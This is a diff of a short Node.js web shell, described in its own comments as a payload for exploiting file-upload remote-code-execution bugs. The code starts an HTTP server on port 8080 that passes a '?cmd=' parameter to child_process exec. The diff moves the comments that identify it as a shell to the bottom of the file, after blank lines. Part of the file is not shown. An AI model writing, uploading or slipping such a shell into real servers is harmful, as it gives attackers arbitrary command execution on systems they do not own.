@@ -1,6 +1,3 @@
-// This codeing we will using with File Upload RCE Bug type and This file expresses the exploited File Upload RCE if server using .js lang ( The section follows the RCE Bug )
-// Simple Web Shell for Node.js
-
 const { exec } = require('child_process');
 const http = require('http');
 
@@ -18,3 +15,9 @@ http.createServer((req, res) => {
         res.end("Node.js Shell Active. Use ?cmd=YourCommand");
     }
 }).listen(8080); // ملاحظة: ممكن تغير البورت إذا كان 8080 مشغول
+
+
+
+
+// This codeing we will using with File Upload RCE Bug type and This file expresses the exploited File Upload RCE if server using .js lang ( The section follows the RCE Bug )
+// Simple Web Shell for Node.js
